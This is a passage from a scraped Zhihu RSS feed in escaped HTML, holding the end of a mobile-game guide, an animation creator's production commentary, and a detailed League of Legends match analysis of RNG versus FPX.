data-original-src=\"v2-f3f28ac9bcc4e74000ba20e2a3386ddc\" data-watermark-src=\"v2-80ae074f25785519d0dcc2242be9d972\" data-private-watermark-src=\"v2-8a45971d10a7943c8787bb8a33f2932d\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d9577838ba51ba1c06160a16ad450d53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1236\" data-watermark=\"watermark\" data-original-src=\"v2-d9577838ba51ba1c06160a16ad450d53\" data-watermark-src=\"v2-5917e4ada9c72562daa05885763242fc\" data-private-watermark-src=\"v2-b7fcaa56c04db716f6fd4437b0551931\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c05b1a274d61bea2ea7f17ae37235951_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"582\" data-watermark=\"watermark\" data-original-src=\"v2-c05b1a274d61bea2ea7f17ae37235951\" data-watermark-src=\"v2-ee4e1b2fcdee2bef2cf43e7ca00a57f7\" data-private-watermark-src=\"v2-1b63ccf0bafbc6e4cbde8c58b39bcdd0\"></p>\n<hr>\n<h2><b>九、东厂线索合集</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/GNVps2comkQYKAcg6vFjCw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-6981a4aa542a001192b905caea0f24cf_l.jpg\" data-image-width=\"455\" data-image-height=\"455\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——路人线索篇</a><hr>\n<h2>十、密探</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/a3qSHW5D3WnAYdMpLexX_A%3Fscene%3D21%23wechat_redirect\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-edf25d94ab427dc72502d4d393bf9be4_bh.jpg\" data-image-width=\"1105\" data-image-height=\"471\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——密探</a><hr>\n<h2>十一、皇子珍宝</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/kA5uXY4t6-F-ctJPH7YJDA\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-388bb2ea6feaa24c2d63e058ae835cbe_bh.jpg\" data-image-width=\"1232\" data-image-height=\"524\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——皇子珍宝</a><hr>\n<h2>十二、飞贼</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/k7X55B4k4VDnnypFozL_yQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-a9f278a78af6f3afe1aa95cfdb579ddb_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——飞贼</a><hr>\n<h2>十三、策卡推荐（待更中）</h2>\n<h3>（一）五行谶纬</h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Bc_cT87uXv55VP15OwK_sg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-40e2b0daaec64171783afca2bcbac268_bh.jpg\" data-image-width=\"1206\" data-image-height=\"513\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——策卡之五行谶纬</a><hr>\n<p><i>还有问题的可以评论区问</i></p>\n<p><i>如果我可以回答我再总结过来</i></p>\n<p><i>谢谢你们点的赞同</i></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7672a8bcd095d5eec04b36ae54d28d00_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"128\" data-watermark=\"watermark\" data-original-src=\"v2-7672a8bcd095d5eec04b36ae54d28d00\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"ad-link-card\" data-ad-id=\"fee_0de7ab2daf224ebf58578c2384719ff5\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-95-63-9?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">魔仙堡大美人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">135 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/376333917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《烟雨江湖》应该怎么玩？有哪些攻略？</a><br><a href=\"http://www.zhihu.com/question/371309642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《三国志14》应该怎么玩？有哪些攻略？</a><br>\n","link":"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《只好背叛地球了》第 1 - 5 集？","date":"2021-06-29 11:30:07","description":"\n<p>评价自家的作品总显得有那么一丝囧~容我跑个题，稍微说一点创作的故事。</p>\n<p>《只好背叛地球了》是改编自抽纸小jin的同名漫画，在开始这个动画项目很久之前，我就已经是漫画的读者，很喜欢这部能哈哈哈地笑着看完的作品，并且还能从中感受到爱的暖意。所以有机会开始这个动画的创作，是含着原作党的爱意启程的。</p>\n<p>然后一顿改。（手动狗头）因为原作短篇体量的问题，编剧团队不得不加入大量的原创内容补足时长，而且我们还有一个对作品的高要求，就是要较为密集的抛梗，不好笑就是原罪，要一直搞笑也是很难的，所以创意导演和编剧团队一直在沙雕能量的增长和释放中左右横跳。</p>\n<p>刚刚也说除了欢乐，背球还想要延续漫画那种包含着爱的暖意的体验，因此后面也融入了许多都市年轻人的情感体验，对家庭对爱人对父母对工作和生活，来源真实情感改编，很多一起工作的小伙伴也会被动画中的这些情感所打动，背球讲了年轻人这一代自己的故事。在欢笑之余，还想给大家带来更多的感动，这是一点私心。</p>\n<p>制作上，一部搞笑泡面番讲究的点在于节奏节奏还是节奏，这对分镜创作有非常高的要求，这里为分镜导演掉下的头发默哀3秒。而且背球有比较长的制作规划，整体时长体量在泡面番中是非常大的~。节奏快体量大，这些对我们声影动漫背球团队来说都是制作难题，但很开心的是，小伙伴们享受动画创作的过程，在给成片效果添砖加瓦的过程中越做越好，完美体现了我们团队对这部作品的诚意。</p>\n<p>漫改动，我一直希望能做到让每一个载体都开一朵有些不一样的花，在一个ip下，即贴合原作，又让动画观众在去看过原作后 还有能被动画吸引住的一些不同的点。可能这算是动画人的执着吧。对于这部作品，我们得到了平台内部和有机会提前观看的观众的正面反馈，这恐怕是最开心的时刻。希望大家喜欢背球，希望大家的生活快乐而又充满爱。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-miao-4-80-24?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王淼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">4 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/285001010?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样评价星游记下一部电影《星游记之冲出地球》？</a><br><a href=\"http://www.zhihu.com/question/51043844?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《吃货宇宙》？</a><br>\n","link":"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"S11夏季赛RNGvsFPX复盘：英雄池差距与运营差距的比赛","date":"2021-06-28 16:15:08","description":"\n<p>大家好，我是尹天，这里是尹天的复盘系列，久违了。</p>\n<p>夏季赛到今天都没怎么写复盘，主要是因为比赛质量低下，难以提起兴趣。故在看完FPX和RNG的第一局之后，我立刻意识到，今晚应该闲不下来了。</p>\n<p>在第一局，FPX展现了当前版本几乎不可能完成的运营：拖住中期劣势。在面对有着优秀运营底子的RNG时 能完成这一点，足以证明FPX目前上限之高。所以，今天关于FPX的内容，我会主要分析他们的运营部分，对于一些亮眼操作可能会放过去。</p>\n<p>在RNG的部分，我会着重讨论他们前中期的兵线理解、BP困境（也就是英雄池困境），或许会嘴一下选手的操作。重点是1、2局，第三局纯粹个人打的太差，没有分析价值。</p>\n<hr>\n<h2>第一局</h2>\n<h3>一、BP分析</h3>\n<p>在开始讨论BP之前，我们先来看一下双方对Ban位的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1816\" data-rawheight=\"442\" class=\"origin_image zh-lightbox-thumb\" width=\"1816\" data-original=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_r.jpg\"></figure><p>双方今晚，RNG三把蓝，三局一轮ban阿卡丽、锤石、赛娜。FPX三把红，三局一轮banEZ、赵信、卢锡安。双方的BP策略根本方向上是一致的，只是大方向有所不同。</p>\n<p>我们来看看，双方为什么采用如此一致的第一轮BP策略。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1754\" data-rawheight=\"822\" class=\"origin_image zh-lightbox-thumb\" width=\"1754\" data-original=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_r.jpg\"></figure><p>在RNG这边，FPX的赛娜是首先要解决的点。目前FPX是联盟中最多次使用赛娜战术的队伍，Lwx五次选用赛娜，胜率80%。赛娜战术是目前快节奏版本里，唯二可以打大后期的下路组合（另外一个是大嘴露露），而且因为塔姆补刀所以中期战斗力更强。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1540\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1540\" data-original=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_r.jpg\"></figure><p>目前，赛娜处于一个多数队伍不太会用，但是只要敢选就很容易打出效果的状态。</p>\n<p>夏季赛到现在，赛娜选用场次只有13场，不多，但是胜率却有69.2%，是使用场次排名前五的AD里胜率最高的。当对上擅长使用赛娜体系的队伍时，赛娜是必须承担的Ban位。</p>\n<p>至于阿卡丽，因为Doinb近期阿卡丽表现不错，而Cryin不会阿卡丽无法自己选，所以蓝色开阿卡丽会是相当糟糕的做法。另外，多说一句，RNG到目前为止，只开过两次阿卡丽。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2074\" data-rawheight=\"944\" class=\"origin_image zh-lightbox-thumb\" width=\"2074\" data-original=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_r.jpg\"></figure><p>就是打OMG的两场，然后被阿卡丽绝活选手Creme操作了一通。</p>\n<p>而关于锤石，这一点似乎FPX在之前比赛中没有表现太多的重视，无论是被ban还是自选，次数都很少。</p>\n<p>唯一比较合理的解释是，FPX和WE的比赛中，FPX第二局拿出厄斐琉斯锤石的下路组，而RNG认为他们没有办法破解类似组合，参照RNG对LNG第一局LNG的金克丝锤石。RNG自己选金克丝锤石并没有取得胜利，在无法破解+无法选用的情况下，锤石自然只能ban掉。</p>\n<p>然后是FPX。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1216\" data-rawheight=\"460\" class=\"origin_image zh-lightbox-thumb\" width=\"1216\" data-original=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_r.jpg\"></figure><p>EZ是GALA夏季赛使用最多的英雄，场次上完全超过其他。而在BLND%（先选率）上，RNG仅仅在给GALA选EZ时，会尝试比对面AD先选，其他所有英雄到目前都是对位后选。可以说，目前EZ是RNG和GALA最自信的下路体系，有ban的价值。</p>\n<p>卢锡安我不用多说，赵信也很简单，赵信+卡尔玛是RNG在夏季赛唯一赢得比赛的体系，虽然因为对手是RW而导致含金量不足，但毕竟是RNG最自信的体系，尊重一手完全没有问题。</p>\n<p>这样一来，鳄鱼和盲僧再度被双开出来：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2710\" data-rawheight=\"1516\" class=\"origin_image zh-lightbox-thumb\" width=\"2710\" data-original=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_r.jpg\"></figure><p>1、第一轮BP</p>\n<p>RNG拿走鳄鱼，FPX对着拿走兰博+盲僧。</p>\n<p>鳄鱼的优先级大于盲僧，在对上线的情况下鳄鱼算是处理盲僧的选择之一，所以职业队伍会在开盲僧的情况下先抢鳄鱼，OMGvsBLG、TTvsUP都采用这样的策略来进行兑子。</p>\n<p>在11.12版本UD被砍以后，目前打野T1就是赵信、兰博、皎月，优先级为赵信＞兰博=皎月。在没有赵信的情况下，兰博皎月可以看情况来拿，皎月适合冲阵体系，兰博适合配poke和一些偏阵地战的阵容。</p>\n<p>RNG对着拿走皎月，然后选出上单格温，确定鳄鱼给中，符合大家对RNG英雄池的一贯预期。FPX第三手拿走瑟提，做一个摇摆位。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、第二轮BP</p>\n<p>FPXban露露、卡莎，限制RNG下路组合选择。RNGban梦魇、武器，他们担心瑟提会摇去辅助，限制掉一些可以操作上单格温的英雄。</p>\n<p>在场上主流AD已经没多少的情况下，FPX先拿走维鲁斯，没问题。RNG对着拿滑板鞋+泰坦，这个组合就算你下路是维鲁斯+瑟提，配合打野一样可以将维鲁斯击杀，展露出了极强的希望打下半区的意图。</p>\n<p>这时候FPX也没什么办法，瑟提不敢再放在下路，不然维鲁斯指定没什么好果汁吃，必须要拿塔姆来保护维鲁斯，那么瑟提就只能摇去上路。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、阵容评价</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1506\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_r.jpg\"></figure><p>从对线上来说，上路格温小劣，中路鳄鱼优势，下路滑板鞋+泰坦3级后更容易拿到线权。</p>\n<p>RNG的阵容中野极度强势，鳄鱼+皎月基本是当前版本最强中野，双稳定控制让这个组合下限极高，这一点优于盲僧+兰博。RNG需要利用中野的优势，尽可能的去多游走下路，利用下路多重稳定控制打开局面，进而解放泰坦，中期利用滑板鞋的强势期带动节奏，快速拿下比赛。</p>\n<p>FPX的阵容更依赖上野配合，瑟提+兰博的组合下限也很高，所以他们更依赖上野优势尽快打穿，把格温打成极度劣势的情况，劣势格温用处很小。然后再通过上半区的优势辐射下路，中期利用兰博的强势点在地图资源上进行团战，快速滚雪球拿下比赛。</p>\n<p>理论分析是这样，但是两队很快打成了完全相反的样子。。。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、对局分析</h3>\n<p>我们分两个部分：前期双方打野博弈、中期FPX运营思路</p>\n<p>1、前期打野博弈：上单如何打乱打野节奏？</p>\n<p>为什么在职业赛场上，被单杀是超出底线的失误？因为这不仅仅会让你线上受损，更会让整个团队的战术布置失效。</p>\n<p>我们从1级开始说。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2933f264ea30c54a00e9a9a08e31198e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"388\" class=\"content_image\" width=\"392\"></figure><p>双方1级都在RNG的红区做了视野，不同的是FPX先做，而RNG后做。</p>\n<p>这样一来，RNG就有了应对该视野的机会，Ming回家出了个扫描，和AD一起把眼排掉，Wei直接蓝开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-18827272e785a2f40ae35b4c9218b87e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>蓝开的Wei让FPX很不安，他们在上半地图全无视野，不知道Wei到底是什么路线。FPXping了两个BUFF，意思就是不确定Wei会不会来换野区。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4a2f621bc637ae54a98139c3863ab97_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>随后，鳄鱼利用前期推线的优势，率先把兵线推了过去并做了一个F6视野。这个在视野教学中和大家提到过，是一个中单有线权时，非常好用的F6眼位。</p>\n<p>通过这个眼，RNG确定，兰博是清半区的刷野思路。而看到鳄鱼离开线上，FPX立刻产生警觉，此时如果皎月和优势兵线的鳄鱼去上半区，第一时间FPX中野一定会更慢，因为盲僧没有线权。</p>\n<p>加上刚刚不确定皎月的路线，兰博索性直接往下半区走，他想确定皎月的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b24f07c76a3d5ca2821b0d9c957bc35b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"392\" class=\"content_image\" width=\"400\"></figure><p>虽然因此确定了皎月的刷野路线，但兰博的路线也被RNG完全确定。</p>\n<p>我们回顾一开始的开野顺序，RNG往下，是想保护下半区。因为前三级兵线优势在FPX手里，所以3级以后，兵线要么在塔前，要么推进去开始回流，打野抓下是最佳机会。所以你看，FPX的辅助去三角草做了一个眼，就是想保护对线。</p>\n<p>相对的，去上的FPX想保护上半区，同样的道理，瑟提前3级有线权，所以只要兵线推进去，三级以后兵线回流，打野速4是正好抓到的。可是小虎没有在上半区做眼，所以Tian这波很有机会抓到。</p>\n<p>两队节奏都布置的很有条理，但是Nuguri被单杀，直接让这个平衡被打破。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1534\" data-rawheight=\"1070\" class=\"origin_image zh-lightbox-thumb\" width=\"1534\" data-original=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_r.jpg\"></figure><p>注意时间，3分16。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-db2f958b39388a11baf9a80e60ee6f54_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>3分16是正常打野完成速4的时间点，此时刷的比较快的一般都刷完四组，大家可以参照一直在刷野没停过的Wei，他就是正好此时速4。如果Nuguri能晚十五秒出问题，兰博就能打完红去上，他就不会死，兰博的刷野路线就能有所收获。</p>\n<p>随着上单阵亡，Tian和Doinb立刻调整路线。因为Ming把Crisp的三角草视野排掉，Wei打算去三角草看看情况，而发现眼被拆掉的Doinb立刻往下走，Tian也放掉石甲虫转而去下，双方的重点立刻聚焦在下路。</p>\n<p>此时，中路兵线被盲僧推进去，即将呈现回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1944\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1944\" data-original=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_r.jpg\"></figure><p>3分33，RNG在下路收获人头。滑板鞋泰坦前期爆发太高了。鳄鱼看到盲僧下来也交T保队友，没什么问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-06d93dbaae5efe4f0005247c58880bf9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"388\" data-rawheight=\"384\" class=\"content_image\" width=\"388\"></figure><p>从打完红到3分33，时间足够兰博走到下路，顺便刷河道蟹。对于没有视野的RNG来说，正常的兰博都会走石甲虫-河道蟹的路线，他们完全没想到兰博会绕道来下。</p>\n<p>你看，第一时间，状态还有一半的皎月在回城，没人想得到T下来的鳄鱼会出事。</p>\n<p>此时，中路兵线正在回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f806714353cf013fd6aac94b870b48e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"406\" class=\"content_image\" width=\"406\"></figure><p>等到盲僧走回线上，一波无比巨大的回推线等着他吃，鳄鱼走到线上会亏至少两波兵线的经验，中路对线基本结束了，战士打战士，最不能接受的就是落后等级。</p>\n<p>这波鳄鱼T下路支援有没有问题？我认为没有，更多是Tian反思维的路线做的好，RNG不可能考虑得到Tian会来下半区，他们完全没有考虑到Tian可能的蹲伏。</p>\n<p>然后Nuguri又被小虎单杀了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-267002cad4c09f1208785babbb4fa43a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"402\" class=\"content_image\" width=\"392\"></figure><p>这波单杀之前，兰博路线是先去上刷留下来的石甲虫，然后继续往下，Tian很细节地把原本完全相反的打野路线调整到和Wei平齐，这样可以保证一定能在下路蹲到Wei的下一次进攻，大家能看到皎月头像上面的红色方问号，这就是Tian调整打野路线的意义。</p>\n<p>这种情况下，上路一定不能出事，出了事儿没有人能来帮的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1048\" data-rawheight=\"952\" class=\"origin_image zh-lightbox-thumb\" width=\"1048\" data-original=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_r.jpg\"></figure><p>结果就出事了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a81d689858eb3aae0b4216e3e1e752d6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>出事儿的同时，中路Doinb推了线以后没去游走，反而是跟鳄鱼塔下操作了一波，双方互相残血。</p>\n<p>那么Tian的时间就被浪费了，他在下路蹲了很久很久。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1b80f56864f49fabee35da1adc78aee5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"398\" class=\"content_image\" width=\"410\"></figure><p>Wei是没有反蹲的，他刷完直接回家，此时Wei领先Tian一个回城再出来的20秒左右时间。Wei利用这个时间排干净了上半区红色方视野，同时率先开始刷自己的野区。</p>\n<p>面对打野落后的局面，FPX变招很快，他们准备把辅助调来上半区。同时，因为上半区的两次被单杀，Tian再次更改自己的刷野路线，选择蓝-石甲虫，再度回到以上路为中心，牺牲掉好不容易对应起来的往下的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bf9912c401d04057edea0f8ff10a2da1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"410\" class=\"content_image\" width=\"408\"></figure><p>因为皎月拆了眼，所以FPX判断草丛有视野，塔姆贴着墙壁走，绕过了这个草丛没有被RNG发现。那么这波塔姆的存在就是FPX对RNG的信息差，很容易利用这个信息差做到事情，至少可以排掉RNG上半区的视野。</p>\n<p>问题是，Nuguri在皎月已经在上半区拆眼的情况下，他完全没考虑打野来抓自己的可能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1388\" data-rawheight=\"1024\" class=\"origin_image zh-lightbox-thumb\" width=\"1388\" data-original=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_r.jpg\"></figure><p>压线太深，眼看到皎月的时候已经晚了。</p>\n<p>这三波小虎打的都很好，该拼就拼该卖就卖。但是Nuguri被击杀三次无论如何都说不过去，因为他，FPX第一波向上的路线没有收益，第二波好不容易把路线调整和RNG一样，又要为了上半区调回去，而塔姆支援的信息差也没能获得人头收益，仅得到一个先锋。</p>\n<p>这就是单杀的最大不利后果：队友的战术被迫围绕你来走，而很多东西执行到一半因为你的阵亡而无法取得收益。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、中期运营思路：FPX是怎么拖住的？</p>\n<p>FPX中期能拖住的关键，是他们在交换资源上做的非常好。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b950fe3ecebe6e3868bd7b77029073ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"400\" class=\"content_image\" width=\"398\"></figure><p>在队友劣势的情况下，Doinb没有贸然去支援。比如这波三个人想去上路抓Nuguri，但是全都失败了，不过Doinb一开始就没打算去，他决定留在中路，利用先锋去吃了两个镀层。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b81db777e405125d3882e9ea2cecef30_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>或者是在鳄鱼离开线上以后，偷吃RNG的F6。</p>\n<p>在他不断偷发育偷经济的时候，处于攻势的RNG来了一波有点问题的兵线运营：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-68f395fe094c2d40db20089148e51fb7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" width=\"398\"></figure><p>此时，皎月在打先锋，FPX想放弃先锋重点去争夺小龙，所以他们让Lwx去处理下路兵线。不过Lwx走得太深入了，遭到了小虎的绕后TPgank。</p>\n<p>这波大家都记得，不过，大家记不记得这波打完以后RNG的处理？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1963725442ab3542080760711516e852_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"398\" class=\"content_image\" width=\"394\"></figure><p>他们让鳄鱼去上，AD和辅助去下，中路完全空置。等到打完小龙以后，一个状态一般的格温才走到中路去清线。</p>\n<p>FPX立刻意识到，此时他们在中塔争夺上，人数反而比RNG更多，因为RNG重点在下路和小龙！</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2144\" data-rawheight=\"1014\" class=\"origin_image zh-lightbox-thumb\" width=\"2144\" data-original=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_r.jpg\"></figure><p>盲僧果断交R打格温的血量，随后配合支援过来的队友将中一塔拆掉。</p>\n<p>RNG用中一塔为代价，交换到一只先锋、一条小龙、一座下一塔，赚一定是赚的。不过先推掉中一塔的人会有一个优势，那就是在推掉中一塔的时候，两侧一定处于无人看守的阶段，此时抓边成功率极高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fbe0cd81d8236e44e4d0067a4fbcc47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"386\" class=\"content_image\" width=\"400\"></figure><p>RNG不是没有察觉，他们狂ping小地图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1230\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1230\" data-original=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_r.jpg\"></figure><p>然后Cryin还往回走。。。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9231873970d1ce939fbdbea93da878ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"398\" class=\"content_image\" 